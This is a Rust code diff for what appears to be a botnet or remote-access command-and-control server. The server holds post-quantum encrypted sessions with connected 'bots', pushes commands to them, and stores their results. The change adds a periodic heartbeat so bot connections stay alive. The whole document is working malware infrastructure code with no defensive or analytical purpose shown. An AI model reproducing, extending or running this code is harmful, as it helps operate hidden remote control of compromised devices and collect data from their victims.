@@ -14,7 +14,7 @@ mod termux;
 use std::collections::HashMap;
 use std::net::SocketAddr;
 use std::sync::Arc;
-use std::time::Instant;
+use std::time::{Duration, Instant};
 
 use axum::{
     extract::State,
@@ -185,39 +185,53 @@ async fn handle_bot(
 
     eprintln!("[+] Bot connected (PQ session): {}", addr);
 
+    const HEARTBEAT_INTERVAL: Duration = Duration::from_secs(30);
+    const HEARTBEAT_CMD: &str = "__heartbeat__";
+
     loop {
-        match rx.recv().await {
-            Some(cmd) => {
-                let json = match serde_json::to_vec(&cmd) {
-                    Ok(j) => j,
-                    Err(_) => continue,
-                };
-
-                if encryption::send_encrypted(&mut socket, &json, &key).await.is_err() {
-                    break;
-                }
-
-                match encryption::recv_encrypted(&mut socket, &key).await {
-                    Ok(data) => {
-                        if let Ok(result) = serde_json::from_slice::<CommandResult>(&data) {
-                            let _ = state.db.insert_result(
-                                Some(cmd.id as i64),
-                                &addr.to_string(),
-                                &cmd.command,
-                                &result.result,
-                            );
-                            state.results.write().await.push(ResultEntry {
-                                bot_addr: addr,
-                                command: cmd.command,
-                                result: result.result,
-                                timestamp: Instant::now(),
-                            });
-                        }
-                    }
-                    Err(_) => break,
+        let cmd = tokio::select! {
+            msg = rx.recv() => {
+                match msg {
+                    Some(c) => c,
+                    None => break,
                 }
             }
-            None => break,
+            _ = tokio::time::sleep(HEARTBEAT_INTERVAL) => {
+                Command { id: 0, command: HEARTBEAT_CMD.to_string(), args: vec![] }
+            }
+        };
+
+        let is_heartbeat = cmd.command == HEARTBEAT_CMD;
+
+        let json = match serde_json::to_vec(&cmd) {
+            Ok(j) => j,
+            Err(_) => continue,
+        };
+
+        if encryption::send_encrypted(&mut socket, &json, &key).await.is_err() {
+            break;
+        }
+
+        match encryption::recv_encrypted(&mut socket, &key).await {
+            Ok(data) => {
+                if !is_heartbeat {
+                    if let Ok(result) = serde_json::from_slice::<CommandResult>(&data) {
+                        let _ = state.db.insert_result(
+                            Some(cmd.id as i64),
+                            &addr.to_string(),
+                            &cmd.command,
+                            &result.result,
+                        );
+                        state.results.write().await.push(ResultEntry {
+                            bot_addr: addr,
+                            command: cmd.command,
+                            result: result.result,
+                            timestamp: Instant::now(),
+                        });
+                    }
+                }
+            }
+            Err(_) => break,
         }
     }
 
